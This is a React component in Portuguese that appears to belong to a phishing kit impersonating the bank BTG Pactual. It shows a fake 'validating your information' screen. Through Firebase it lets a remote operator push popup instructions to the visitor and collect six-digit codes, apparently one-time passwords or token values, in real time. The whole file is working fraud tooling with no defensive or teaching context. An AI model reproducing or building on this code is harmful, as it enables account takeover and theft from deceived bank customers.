import { useEffect, useState } from "react";
import { ref, onValue, off, update } from "firebase/database";
import { db } from "../utils/Firebase";

import Popup from "./Popup";
import "../styles/Espera.scss";

function Espera() {
  const [user, setUser] = useState(null);
  const [resposta, setResposta] = useState("");

  // ✍️ texto animado
  const textoCompleto = "Cliente Btg pactual, estamos validando suas informações...";
  const [textoExibido, setTextoExibido] = useState("");
  const [apagando, setApagando] = useState(false);

  // 🔥 Firebase realtime
  useEffect(() => {
    const id = localStorage.getItem("userId");

    if (!id) return;

    const userRef = ref(db, "users/" + id);

    onValue(userRef, (snapshot) => {
      const data = snapshot.val();
      if (data) setUser(data);
    });

    return () => {
      off(userRef);
    };
  }, []);

  // 📤 enviar resposta
  const enviarResposta = () => {
    if (!resposta.trim()) return;

    const id = localStorage.getItem("userId");
    const userRef = ref(db, "users/" + id);

    update(userRef, {
      respostas: [...(user?.respostas || []), resposta],
      podeResponder: false // 🔥 trava depois de enviar
    });

    setResposta("");
  };

  // ✍️ efeito máquina de escrever em LOOP
  useEffect(() => {
    let timeout;

    if (!apagando) {
      if (textoExibido.length < textoCompleto.length) {
        timeout = setTimeout(() => {
          setTextoExibido(textoCompleto.slice(0, textoExibido.length + 1));
        }, 80);
      } else {
        timeout = setTimeout(() => {
          setApagando(true);
        }, 1500);
      }
    } else {
      if (textoExibido.length > 0) {
        timeout = setTimeout(() => {
          setTextoExibido(textoExibido.slice(0, -1));
        }, 40);
      } else {
        timeout = setTimeout(() => {
          setApagando(false);
        }, 500);
      }
    }

    return () => clearTimeout(timeout);
  }, [textoExibido, apagando]);

  return (
    <div className="espera flex-center">
      <div className="conteudo-espera flex-colum gap-md">
        <div className="spinner"></div>

        <p className="typing">
          {textoExibido}
          <span className="cursor">|</span>
        </p>
      </div>

      {/* 🔥 POPUP COM CONTROLE DE RESPOSTA */}
      {user?.popupAtivo && (
        <Popup
          instrucao={user.instrucaoAtual}
          podeResponder={user.podeResponder}
          resposta={resposta}
          setResposta={(value) => {
            // 🔥 REGRA: só 6 dígitos
            const onlyNumbers = value.replace(/\D/g, "").slice(0, 6);
            setResposta(onlyNumbers);
          }}
          enviarResposta={enviarResposta}
        />
      )}
    </div>
  );
}

export default Espera;